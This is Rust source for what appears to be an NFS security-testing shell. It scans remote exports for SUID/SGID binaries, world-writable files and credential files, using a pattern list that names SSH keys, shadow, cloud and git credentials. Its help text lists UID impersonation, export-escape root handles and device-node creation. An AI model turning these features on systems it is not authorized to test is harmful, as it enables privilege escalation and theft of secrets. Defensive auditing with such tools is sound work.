fn suid_scan_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
        for entry in &entries {
            if entry.name == "." || entry.name == ".." {
                continue;
            }
            let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
            if let Some(ref a) = entry.attrs {
                // SUID = 0o4000, SGID = 0o2000 (RFC 1094 sec. 2.3.5)
                if a.file_type == FileType::Regular && (a.mode & 0o6000 != 0) {
                    let tag = match a.mode & 0o6000 {
                        0o6000 => "SUID+SGID",
                        0o4000 => "SUID",
                        _ => "SGID",
                    };
                    println!("{} {:04o}  uid={}  {path}", format!("[!] {tag}").yellow().bold(), a.mode & 0o7777, a.uid);
                }
                if a.file_type == FileType::Directory
                    && let Some(ref fh) = entry.handle
                {
                    suid_scan_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
                }
            }
        }
    })
}

/// Recursive world-writable scanner.
fn world_writable_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
        for entry in &entries {
            if entry.name == "." || entry.name == ".." {
                continue;
            }
            let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
            if let Some(ref a) = entry.attrs {
                // World-write bit = 0o002
                if a.mode & 0o002 != 0 {
                    let tc = type_char(a);
                    println!("{} {:04o}  uid={}  {path}", format!("[!] world-writable ({tc})").yellow(), a.mode & 0o7777, a.uid);
                }
                if a.file_type == FileType::Directory
                    && let Some(ref fh) = entry.handle
                {
                    world_writable_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
                }
            }
        }
    })
}

/// Common credential/secret filename patterns to flag during a secrets scan.
const SECRET_PATTERNS: &[&str] = &[
    "id_rsa",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    ".env",
    "shadow",
    "passwd",
    ".htpasswd",
    "credentials",
    "secret",
    "password",
    "token",
    "apikey",
    "api_key",
    "private_key",
    "privkey",
    ".pem",
    ".p12",
    ".pfx",
    ".kdbx",
    "authorized_keys",
    "known_hosts",
    "docker-compose",
    ".npmrc",
    ".pypirc",
    ".git-credentials",
    "wp-config.php",
    "settings.py",
    "database.yml",
    "config.php",
    "secrets.yaml",
    "secrets.json",
    ".aws",
    ".ssh",
];

/// Recursive secrets scanner.
fn secrets_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
        for entry in &entries {
            if entry.name == "." || entry.name == ".." {
                continue;
            }
            let path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
            let lower = entry.name.to_ascii_lowercase();
            if SECRET_PATTERNS.iter().any(|pat| lower.contains(pat)) {
                let size = entry.attrs.as_ref().map_or(0, |a| a.size);
                println!("{} {path}  ({size} bytes)", "[!] potential secret:".yellow().bold());
            }
            if entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory)
                && let Some(ref fh) = entry.handle
            {
                secrets_recursive(Arc::clone(&nfs3), fh.clone(), path).await;
            }
        }
    })
}

// =============================================================================
// Pure formatting helpers
// =============================================================================

/// Derive fuser-style file type character from `FileAttrs`.
const fn type_char(a: &FileAttrs) -> char {
    match a.file_type {
        FileType::Directory => 'd',
        FileType::Symlink => 'l',
        FileType::Block => 'b',
        FileType::Character => 'c',
        FileType::Fifo => 'p',
        FileType::Socket => 's',
        FileType::Regular => '-',
    }
}

/// Format a Unix permission mode word as `rwxrwxrwx` (9 chars).
fn format_mode(mode: u32) -> String {
    let bits = [(0o400, 'r'), (0o200, 'w'), (0o100, 'x'), (0o040, 'r'), (0o020, 'w'), (0o010, 'x'), (0o004, 'r'), (0o002, 'w'), (0o001, 'x')];
    bits.iter().map(|(mask, ch)| if mode & mask != 0 { *ch } else { '-' }).collect()
}

/// Colorize a directory entry name by type.
fn colorize_name(name: &str, tc: char) -> String {
    match tc {
        'd' => name.blue().bold().to_string(),
        'l' => name.cyan().to_string(),
        'b' | 'c' => name.yellow().to_string(),
        _ => name.to_owned(),
    }
}

/// Print detailed stat output for a file.
///
/// Displays all 13 fields from the NFSv3 fattr3 wire format (RFC 1813 sec. 2.6).
fn print_stat(name: &str, a: &FileAttrs) {
    println!("  File: {name}");
    println!("  Type: {:?}", a.file_type);
    println!("  Mode: {:04o} ({}{})  Links: {}", a.mode & 0o7777, type_char(a), format_mode(a.mode), a.nlink);
    println!("   UID: {}  GID: {}", a.uid, a.gid);
    println!(" Inode: {}  FSID: {}", a.fileid, a.fsid);
    println!("  Size: {} bytes  Used: {} bytes (disk)", a.size, a.used);
    if a.file_type == FileType::Block || a.file_type == FileType::Character {
        println!(" Rdev: {}:{}", a.rdev.0, a.rdev.1);
    }
    println!(" atime: {}  ({}.{})", fmt_unix_time(a.atime.seconds), a.atime.seconds, a.atime.nseconds);
    println!(" mtime: {}  ({}.{})", fmt_unix_time(a.mtime.seconds), a.mtime.seconds, a.mtime.nseconds);
    println!(" ctime: {}  ({}.{})", fmt_unix_time(a.ctime.seconds), a.ctime.seconds, a.ctime.nseconds);
}

/// Build a display path by appending `target` to `cwd`.
///
/// Handles `..` (pop last component) and strips trailing slashes.
fn build_path(cwd: &str, target: &str) -> String {
    let mut components: Vec<&str> = cwd.split('/').filter(|c| !c.is_empty()).collect();
    for part in target.split('/').filter(|c| !c.is_empty()) {
        if part == ".." {
            components.pop();
        } else if part != "." {
            components.push(part);
        }
    }
    if components.is_empty() { "/".to_owned() } else { format!("/{}", components.join("/")) }
}

/// Split a string at the first whitespace into (first, rest).
fn split2(line: &str) -> (&str, &str) {
    let line = line.trim();
    match line.find(|c: char| c.is_whitespace()) {
        Some(pos) => (line[..pos].trim(), line[pos..].trim()),
        None => (line, ""),
    }
}

/// Sort field selector for the `ls` command.
#[derive(Default, Clone, Copy, Debug)]
enum LsSort {
    /// Alphabetical by filename (default).
    #[default]
    Name,
    /// Ascending inode number (fileid).
    Inode,
    /// Ascending file size.
    Size,
    /// Ascending owner UID.
    Uid,
    /// Ascending owner GID.
    Gid,
    /// Ascending permission mode bits.
    Mode,
    /// Ascending modification time (mtime).
    Mtime,
    /// Ascending metadata-change time (ctime).
    Ctime,
    /// Ascending access time (atime).
    Atime,
}

/// Strip a known flag token from the front of `s`.
///
/// Returns `Some(remainder)` only when the flag is followed by whitespace or
/// end of string, preventing partial matches (e.g. `--reverse-foo`).
fn strip_flag<'a>(s: &'a str, flag: &str) -> Option<&'a str> {
    let after = s.strip_prefix(flag)?;
    if after.is_empty() || after.starts_with(|c: char| c.is_whitespace()) { Some(after.trim_start()) } else { None }
}

/// Parse `ls [--sort=FIELD] [-r|--reverse] [-a] [path]` into
/// `(sort, reverse, all_cols, path)`.
///
/// Flags may appear in any order before the path argument.
/// `-a` enables the extended column set: inode, nlink, used, rdev, atime, ctime.
/// Recognised FIELD values: name, inode, size, uid, gid, mode, mtime, ctime, atime.
/// Unknown fields fall back to `LsSort::Name`.
fn parse_ls_args(raw: &str) -> (LsSort, bool, bool, &str) {
    let mut rest = raw.trim();
    let mut sort = LsSort::default();
    let mut reverse = false;
    let mut all_cols = false;

    // Consume flags left-to-right; stop at the first unrecognised token (= path).
    loop {
        if let Some(after_sort) = rest.strip_prefix("--sort=") {
            let (field, remainder) = split2(after_sort);
            sort = match field {
                "inode" | "fileid" => LsSort::Inode,
                "size" => LsSort::Size,
                "uid" => LsSort::Uid,
                "gid" => LsSort::Gid,
                "mode" | "perms" => LsSort::Mode,
                "mtime" | "time" => LsSort::Mtime,
                "ctime" | "change" => LsSort::Ctime,
                "atime" | "access" => LsSort::Atime,
                _ => LsSort::Name,
            };
            rest = remainder;
        } else if let Some(r) = strip_flag(rest, "--reverse") {
            reverse = true;
            rest = r;
        } else if let Some(r) = strip_flag(rest, "-r") {
            reverse = true;
            rest = r;
        } else if let Some(r) = strip_flag(rest, "-a") {
            all_cols = true;
            rest = r;
        } else {
            break;
        }
    }

    (sort, reverse, all_cols, rest)
}

/// Compare two directory entries for stable `ls` sorting.
///
/// Ties at every level are broken by byte-order filename comparison so the
/// result is deterministic regardless of server-returned order.
fn ls_cmp(a: &DirEntryPlus, b: &DirEntryPlus, sort: LsSort) -> std::cmp::Ordering {
    let name_ord = a.name.cmp(&b.name);
    match sort {
        LsSort::Name => name_ord,
        LsSort::Inode => {
            let ia = a.attrs.as_ref().map_or(0u64, |x| x.fileid);
            let ib = b.attrs.as_ref().map_or(0u64, |x| x.fileid);
            ia.cmp(&ib).then(name_ord)
        },
        LsSort::Size => {
            let sa = a.attrs.as_ref().map_or(0u64, |x| x.size);
            let sb = b.attrs.as_ref().map_or(0u64, |x| x.size);
            sa.cmp(&sb).then(name_ord)
        },
        LsSort::Uid => {
            let ua = a.attrs.as_ref().map_or(0u32, |x| x.uid);
            let ub = b.attrs.as_ref().map_or(0u32, |x| x.uid);
            ua.cmp(&ub).then(name_ord)
        },
        LsSort::Gid => {
            let ga = a.attrs.as_ref().map_or(0u32, |x| x.gid);
            let gb = b.attrs.as_ref().map_or(0u32, |x| x.gid);
            ga.cmp(&gb).then(name_ord)
        },
        LsSort::Mode => {
            let ma = a.attrs.as_ref().map_or(0u32, |x| x.mode);
            let mb = b.attrs.as_ref().map_or(0u32, |x| x.mode);
            ma.cmp(&mb).then(name_ord)
        },
        LsSort::Mtime => {
            let ta = a.attrs.as_ref().map_or(0u32, |x| x.mtime.seconds);
            let tb = b.attrs.as_ref().map_or(0u32, |x| x.mtime.seconds);
            ta.cmp(&tb).then(name_ord)
        },
        LsSort::Ctime => {
            let ta = a.attrs.as_ref().map_or(0u32, |x| x.ctime.seconds);
            let tb = b.attrs.as_ref().map_or(0u32, |x| x.ctime.seconds);
            ta.cmp(&tb).then(name_ord)
        },
        LsSort::Atime => {
            let ta = a.attrs.as_ref().map_or(0u32, |x| x.atime.seconds);
            let tb = b.attrs.as_ref().map_or(0u32, |x| x.atime.seconds);
            ta.cmp(&tb).then(name_ord)
        },
    }
}

/// Days in each month for a common (non-leap) year.
const MONTH_DAYS_NORMAL: [u64; 12] = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

/// Days in each month for a leap year.
const MONTH_DAYS_LEAP: [u64; 12] = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

/// Format a Unix epoch timestamp (seconds since 1970-01-01 UTC) as
/// `YYYY-MM-DD HH:MM:SS`.
///
/// Pure integer arithmetic -- no external crate required.
/// Valid for any u32 timestamp (up to 2106-02-07).
fn fmt_unix_time(secs: u32) -> String {
    let s = u64::from(secs);
    let sec = s % 60;
    let min = (s / 60) % 60;
    let hour = (s / 3600) % 24;
    let mut days = s / 86400;

    // Advance year by year, subtracting its day count.
    let mut year = 1970u64;
    let mut yd = if is_leap_year(year) { 366u64 } else { 365u64 };
    while days >= yd {
        days -= yd;
        year += 1;
        yd = if is_leap_year(year) { 366 } else { 365 };
    }

    let months = if is_leap_year(year) { &MONTH_DAYS_LEAP } else { &MONTH_DAYS_NORMAL };
    let mut month = 1u64;
    for &md in months {
        if days < md {
            break;
        }
        days -= md;
        month += 1;
    }
    let day = days + 1;

    format!("{year:04}-{month:02}-{day:02} {hour:02}:{min:02}:{sec:02}")
}

/// Gregorian leap-year predicate.
const fn is_leap_year(y: u64) -> bool {
    y.is_multiple_of(4) && (!y.is_multiple_of(100) || y.is_multiple_of(400))
}

/// Parse `uid`, `uid:gid`, or `:gid` into `(Option<u32>, Option<u32>)`.
fn parse_uid_gid(spec: &str) -> (Option<u32>, Option<u32>) {
    if let Some(pos) = spec.find(':') {
        let uid = spec[..pos].parse::<u32>().ok();
        let gid = spec[pos + 1..].parse::<u32>().ok();
        (uid, gid)
    } else {
        (spec.parse::<u32>().ok(), None)
    }
}

/// True when an anyhow error contains a permission-denied NFS status.
fn is_nfs_acces(e: &anyhow::Error) -> bool {
    let msg = e.to_string();
    msg.contains("NFS3ERR_ACCES") || msg.contains("NFS3ERR_PERM")
}

/// Print the command reference.
fn print_help() {
    println!("{}", "NFS shell commands:".bold());
    println!();
    println!("{}", "Navigation:".bold().underline());
    println!("  ls [-a] [--sort=FIELD] [-r] [path]  list directory; -a adds inode/nlink/used/rdev/atime/ctime columns; -r reverses");
    println!("  cd <path>                  change directory  (/ = export root, /abs = absolute)");
    println!("  pwd                        print current path");
    println!("  tree [depth]               recursive tree (default depth 3)");
    println!("  find <pattern>             find filenames containing pattern");
    println!();
    println!("{}", "File operations:".bold().underline());
    println!("  cat <file>                 print file contents");
    println!("  get <remote> [local]       download file");
    println!("  put <local> <remote>       upload file  [--allow-write]");
    println!("  rm <file>                  remove file  [--allow-write]");
    println!("  mkdir <dir>                create directory  [--allow-write]");
    println!("  rmdir <dir>                remove directory  [--allow-write]");
    println!("  mv <src> <dst>             rename/move  [--allow-write]");
    println!("  cp <src> <dst>             copy file  [--allow-write]");
    println!("  symlink <target> <name>    create symlink  [--allow-write]");
    println!("  readlink <path>            read symlink target");
    println!();
    println!("{}", "Attributes:".bold().underline());
    println!("  stat [path]                show file attributes");
    println!("  chmod <mode> <path>        set mode (octal)  [--allow-write]");
    println!("  chown <uid>[:<gid>] <path> set owner  [--allow-write]");
    println!();
    println!("{}", "Identity  (AUTH_SYS is client-asserted, RFC 5531 sec. 14):".bold().underline());
    println!("  whoami                     show current uid:gid");
    println!("  uid <n>                    switch UID");
    println!("  gid <n>                    switch GID");
    println!("  impersonate <uid>:<gid>    switch both");
    println!();
    println!("{}", "Devices:".bold().underline());
    println!("  mknod <name> c|b <maj> <min>  create device node  [--allow-write]");
    println!();
    println!("{}", "Analysis:".bold().underline());
    println!("  suid-scan                  find SUID/SGID binaries");
    println!("  world-writable             find world-writable files");
    println!("  secrets-scan               find credential/secret files");
    println!();
    println!("{}", "Escape (F-2.1 -- construct filesystem root handle):".bold().underline());
    println!("  escape-root                build and switch to FS root handle");
    println!("  mount-handle <hex>         jump to arbitrary file handle");
    println!("  handle                     print current dir handle (hex)");
    println!();
    println!("{}", "Local:".bold().underline());
    println!("  lcd [dir]   lls [dir]   lpwd   lmkdir <dir>");
    println!();
    println!("{}", "Session:".bold().underline());
    println!("  history     help     exit");
}
